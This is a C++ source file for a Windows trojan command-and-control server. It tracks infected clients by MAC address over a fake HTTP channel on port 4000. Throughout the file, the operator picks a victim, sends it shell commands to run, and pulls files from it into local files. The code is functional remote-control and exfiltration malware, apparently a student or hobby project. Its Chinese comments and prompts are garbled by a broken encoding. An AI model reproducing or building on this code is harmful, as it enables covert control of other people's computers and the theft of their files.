// Server.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <winsock2.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")
#define LOCAL_PORT 4000
#define LOCAL_IP_ADDRESS "0.0.0.0"

#define CMD_NULL		0
#define CMD_CMD			1
#define CMD_DOWNLOAD	2

#define MAX_CMD_LEN		256
#define MAC_ADDR_LEN	18
#define DEFAULT_BUFLEN 1024

typedef struct _TROJAN_INFO
{
	short live_flag;
	char mac[MAC_ADDR_LEN];
	short cmd_no;
	char cmd[MAX_CMD_LEN];
}TROJAN_INFO, *PTROJAN_INFO;
// cmd like:
// dir
// remoteFile*localFile: c:\\1.txt*d:\\2.txt

#define MAX_CLIENT_NUM		10
#define NOW_CLIENT_NUM		3
TROJAN_INFO g_trojan_info[MAX_CLIENT_NUM];
bool inflag = 0;
int now_client_num = 0;

CRITICAL_SECTION cs;
//EnterCriticalSection(&cs);
//LeaveCriticalSection(&cs);

char* protocolHead = "HTTP/1.1 200 OK\r\nServer: Server <0.1>\r\n"
"Accept-Ranges: bytes\r\nContent-Length: %d\r\nConnection: close\r\n"
"Content-Type: %s\r\n\r\n";


char * killhead(char* headcmd)
{
	return strncpy(headcmd, strstr(headcmd, "\r\n\r\n")+4, MAC_ADDR_LEN);
}

char* combine(char *s1, char *s2)
{
	char *result = (char *)malloc(strlen(s1) + strlen(s2) + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	strcat(result, s2);
	return result;
}


void init()
{
	int i = 0;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		g_trojan_info[i].live_flag = 0;
		memset(g_trojan_info[i].mac, 0, MAC_ADDR_LEN);
		g_trojan_info[i].cmd_no = CMD_NULL;
		memset(g_trojan_info[i].cmd, 0, MAX_CMD_LEN);
	}

	InitializeCriticalSection(&cs);
}

int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
{
	int iResult;    //�洢����recv�����ķ���ֵ
	int cnt;         //����ͳ������ڹ̶����ȣ�ʣ������ֽ���δ����
	cnt = fixedlen;
	while ( cnt > 0 ) {
		iResult = recv(s, recvbuf, cnt, 0);
		if ( iResult < 0 ){
			//���ݽ��ճ��ִ��󣬷���ʧ��
			printf("���շ�������: %d\n", WSAGetLastError());
			return -1;
		}
		if ( iResult == 0 ){
			//�Է��ر����ӣ������ѽ��յ���С��fixedlen���ֽ���
			printf("���ӹر�\n");
			return fixedlen - cnt;
		}
		//printf("���յ����ֽ���: %d\n", iResult);
		//���ջ���ָ������ƶ�
		recvbuf +=iResult;
		//����cntֵ
		cnt -=iResult;         
	}
	return fixedlen;
}

void remove_trojan_from_list(char *MacAddr)
{
	
	int i = 0;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			g_trojan_info[i].live_flag = 0;
			memset(g_trojan_info[i].mac, 0, MAC_ADDR_LEN);
			g_trojan_info[i].cmd_no = CMD_NULL;
			memset(g_trojan_info[i].cmd, 0, MAX_CMD_LEN);
			break;
		}
	}
}

void add_trojan_to_list(char *MacAddr)
{
	int i = 0;
	int free_index = -1;
    
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(g_trojan_info[i].live_flag == 0)
		{
			free_index = i;
			cout << i;
			break;
		}
	}

	if(free_index != -1)
	{
		g_trojan_info[free_index].live_flag = 1;
		memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
		g_trojan_info[free_index].cmd_no = CMD_NULL;
		memset(g_trojan_info[free_index].cmd, 0, MAX_CMD_LEN);
	}

}

int get_cmd_by_mac(char *MacAddr, char *CmdBuff)
{
	int i = 0;
	int CmdNo = CMD_NULL;
	for(i=0; i<MAX_CLIENT_NUM; i++)
	{
		if(0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			CmdNo = g_trojan_info[i].cmd_no;
			sprintf(CmdBuff, "%d#%s", CmdNo, g_trojan_info[i].cmd);
			g_trojan_info[i].cmd_no = CMD_NULL;
			break;
		}
	}
	return CmdNo;
}

void cmd()
{
	int i = 0;
	int free_index = -1;
	int kind;
	if (inflag|| now_client_num<NOW_CLIENT_NUM)return;
	inflag = 1;
	/*cout << "�Ƿ���ָ��"  << "��(y/n)   ";
	char a;
	cin >> a;
	if (a == 'y' || a == 'Y')
	{*/
		

	EnterCriticalSection(&cs);

	char  MacAddr[MAC_ADDR_LEN];
	cout << "\n������Ҫ���͵Ŀͻ���Mac��ַ�� ";
	cin >> MacAddr;

	for (i = 0; i<MAX_CLIENT_NUM; i++)
	{
		if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
		{
			free_index = i;
			break;
		}
	}

	if (free_index != -1)
	{
		g_trojan_info[free_index].live_flag = 1;
		//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
		cout << "������Ҫ���͵�ָ�����ࣺ" << endl << "1.��ָͨ�� 2.�ļ�����ָ��" << endl << "(1/2)  ";
		cin >> kind;
		if (kind == 1)
		{
			g_trojan_info[free_index].cmd_no = CMD_CMD;
		}
		if (kind == 2)
		{
			g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
		}
		cout << "����Ҫ���͵�ָ�";
		cin >> g_trojan_info[free_index].cmd;
	}
	else { cout << "�ͻ���mac��ַ����"; }


	/*}
	else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/

	LeaveCriticalSection(&cs);
	inflag = 0;
	return;
}

DWORD WINAPI InputThread(LPVOID lpParameter)
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	int i = 0;
	int free_index = -1;
	int kind;
	/*if (inflag || now_client_num<NOW_CLIENT_NUM)return;
	inflag = 1;*/

	while (TRUE)
	{
		char  MacAddr[MAC_ADDR_LEN];
		cout << "������Ҫ���͵Ŀͻ���Mac��ַ�� ";
		cin >> MacAddr;

		cout << "->"<<now_client_num;
		for (i = 0; i<MAX_CLIENT_NUM; i++)
		{
			cout << g_trojan_info[i].mac << endl;
			if (0 == memcmp(g_trojan_info[i].mac, MacAddr, MAC_ADDR_LEN))
			{
				free_index = i;
				break;
			}
		}

		if (free_index != -1)
		{
			g_trojan_info[free_index].live_flag = 1;
			//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
			cout << "������Ҫ���͵�ָ�����ࣺ" << endl << "1.��ָͨ�� 2.�ļ�����ָ��" << endl << "(1/2)  ";
			cin >> kind;
			if (kind == 1)
			{
				g_trojan_info[free_index].cmd_no = CMD_CMD;
			}
			if (kind == 2)
			{
				g_trojan_info[free_index].cmd_no = CMD_DOWNLOAD;
			}
			cout << "����Ҫ���͵�ָ�";
			cin >> g_trojan_info[free_index].cmd;
		}
		else { cout << "�ͻ���mac��ַ����"; }

		Sleep(1000);
		/*}
		else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/

		/*inflag = 0;
		return;*/
	}

	closesocket(ClientSocket);
	return 0;
}

DWORD WINAPI ClientThread(LPVOID lpParameter)
{
	SOCKET ClientSocket = (SOCKET)lpParameter;
	int Ret = 0;
	char RecvBuffer[MAX_PATH];
	int CmdNo;
	DWORD CmdLen;
	char CmdBuff[MAX_CMD_LEN];
	char LocalFile[MAX_PATH];
	char *strTmp;
	bool bFirst = true;
	now_client_num++;

	while( TRUE )
	{
		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
		if (Ret > 0)
		{
			cout << "���յ�GET����" << RecvBuffer << "(" << Ret << ")" << endl;
		}

		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
		if (Ret > 0)
		{
			cout << "���յ�POST����" << RecvBuffer << "(" << Ret << ")" << endl;
		}
		cout << "\n--------------------------------\n���ӵ�ľ��mac��ַΪ" << killhead(RecvBuffer) << endl;

		/*if ( Ret != MAX_PATH)
		{
			cout << "�ͻ����쳣���˳�!" << endl;
			remove_trojan_from_list(RecvBuffer);
			break;
		}*/
		
		if(bFirst){
			cout << "��ӵ�ľ���б�" << endl;
			remove_trojan_from_list(RecvBuffer);
			add_trojan_to_list(RecvBuffer);
			bFirst = false;
		}

		//cmd(RecvBuffer);
		
		
		// check if the trojan has an cmd to do
		memset(CmdBuff, 0, MAX_CMD_LEN);
		CmdNo = get_cmd_by_mac(RecvBuffer, CmdBuff);

		char recvbuf[DEFAULT_BUFLEN];
		FILE *file = NULL;
		char *filename = LocalFile;
		int invfilelen, filelen;
		int recvbuflen = DEFAULT_BUFLEN;
		int iResult;

		switch(CmdNo)
		{
		case CMD_NULL:
			//cout << "��ʱδ�������\n";
			CmdLen = 0;
			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			break;
		case CMD_CMD:
			cout << "ִ������" << CmdBuff << endl;
			cout << "�����Ϊ" << strlen(CmdBuff) << "!\n";
			CmdLen = htonl(strlen(CmdBuff));
			// send cmd len
			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			// send cmd content
			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
			// recv cmd result from trojan
			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
			printf("���յ���������:  %s(%d)\n", recvbuf, iResult);
			break;
		case CMD_DOWNLOAD:
			cout << "ִ���ļ�����" << endl;
			// get local file name
			strTmp = strstr(CmdBuff, "*");
			strcpy(LocalFile, strTmp+1);

			// reset cmd information
			CmdBuff[strTmp-CmdBuff] = '\0';
			CmdLen = htonl(strlen(CmdBuff));
			cout << "Ŀ���ļ�Ϊ" << CmdBuff << endl;
			// send cmd len
			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
			// send cmd content
			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
			// recv file from trojan


			

			iResult = recv(ClientSocket, recvbuf, sizeof(char *), 0);
			if (iResult >0)
			{
				invfilelen = *((int *)recvbuf);
				cout << "���ݳ��ȵ������ֽ���Ϊ  " << invfilelen << endl;
				filelen = ntohl(invfilelen);
				cout << "���ݳ���Ϊ  " << filelen << endl;
			}
			file = fopen(filename, "wb+");
			if (file == NULL) { cout << "���ļ�ʧ�ܣ�" << endl; return -1; }

			int torecvlen = filelen;
			// �����������ݣ�ֱ���Է��ر����� 
			do
			{
				iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
				if (iResult > 0)
				{
					cout << "����" << torecvlen << "���ֽ���Ҫ����" << endl;
					int recvlen = iResult;
					if (iResult > torecvlen)recvlen = torecvlen;
					fwrite(recvbuf, 1, recvlen, file);
					torecvlen -= recvlen;
					if (torecvlen <= 0)break;

					//���1���ɹ����յ�����
					//printf("���յ�����:  %s(%d)\n", recvbuf, iResult);

				}
				else if (iResult == 0)
				{
					//���2�����ӹر�
					printf("���ӹر�...\n");
				}
				else
				{
					//���3�����շ�������
					printf("���շ������󣡴�����: %d\n", WSAGetLastError());
					closesocket(ClientSocket);
					return -1;
				}
			} while (iResult > 0);

			fclose(file);

			cout << "�ļ����سɹ���" << endl;

			break;
		}
	}

	closesocket(ClientSocket);
	return 0;
}


int main(int argc, char* argv[])
{
	WSADATA  Ws;
	SOCKET ServerSocket, ClientSocket;
	struct sockaddr_in LocalAddr, ClientAddr;
	int Ret = 0;
	int AddrLen = 0;
	HANDLE hThread = NULL;
	HANDLE inThread = NULL;

	init();

	//Init Windows Socket
	if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
	{
		cout<<"Init Windows Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	//Create Socket
	ServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( ServerSocket == INVALID_SOCKET )
	{
		cout<<"Create Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_addr.s_addr = inet_addr(LOCAL_IP_ADDRESS);
	LocalAddr.sin_port = htons(LOCAL_PORT);
	memset(LocalAddr.sin_zero, 0x00, 8);

	//Bind Socket
	Ret = bind(ServerSocket, (struct sockaddr*)&LocalAddr, sizeof(LocalAddr));
	if ( Ret != 0 )
	{
		cout<<"Bind Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}
	//listen
	Ret = listen(ServerSocket, 10);
	if ( Ret != 0 )
	{
		cout<<"listen Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	cout<<"������Ѿ�����"<<endl;


	inThread = CreateThread(NULL, 0, InputThread, (LPVOID)ServerSocket, 0, NULL);
	if (inThread == NULL)
	{
		cout << "Create Thread Failed!" << endl;
	}

	while ( true )
	{
		AddrLen = sizeof(ClientAddr);
		ClientSocket = accept(ServerSocket, (struct sockaddr*)&ClientAddr, &AddrLen);
		if ( ClientSocket == INVALID_SOCKET )
		{
			cout<<"Accept Failed::"<<GetLastError()<<endl;
			break;
		}


		cout << "\n\n�ͻ�������::" << inet_ntoa(ClientAddr.sin_addr)<<":" << ClientAddr.sin_port << endl;

		hThread = CreateThread(NULL, 0, ClientThread, (LPVOID)ClientSocket, 0, NULL);
		if ( hThread == NULL )
		{
			cout<<"Create Thread Failed!"<<endl;
			break;
		}

		CloseHandle(hThread);
	}

	Sleep(INFINITE);

	CloseHandle(inThread);
	closesocket(ServerSocket);
	//closesocket(ClientSocket);
	WSACleanup();

	return 0;
}